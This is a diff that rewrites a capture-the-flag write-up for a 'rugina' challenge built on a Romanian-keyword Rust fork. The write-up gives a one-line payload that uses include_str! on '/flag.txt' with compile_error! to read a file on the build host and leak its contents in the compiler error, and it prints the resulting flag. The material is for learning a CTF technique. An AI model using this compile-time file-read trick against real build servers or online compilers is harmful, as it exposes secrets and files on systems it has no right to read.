@@ -1,11 +1,20 @@
-The web ide runs the Rugina fork of the rust at first glance (well yeah i already had fun with this in my free time)
-In reality is it just a list full of macros in romanian of the Rust language and i explained that to chatgpt and i got one genius
-idea: to compile-time features to leak flag via errors using the following script: 
+# _rugina_
 
-`
-principal() { } //without a main code it will throw a compilation error                  
-compile_error!(include_str!("/flag.txt"));
-`
+Category | Value
+-- | --
+Misc | 100
 
+***
 
+```rust
+principal() { } compile_error!(include_str!("/flag.txt"));
+```
 
+* `principal()` is the new `main()`.
+* `include_str!("/flag.txt")` reads the file **at compile time** (note the leading `/`: it’s an absolute path on the build machine).
+* `compile_error!(...)` unconditionally **aborts compilation** and prints its argument as the error message.
+
+## Proof-of-flag
+```
+ctf{73523e676b04e1c2db176d8035648893648b969f5ddf5ac40f8fc5b6c15d8692}
+```
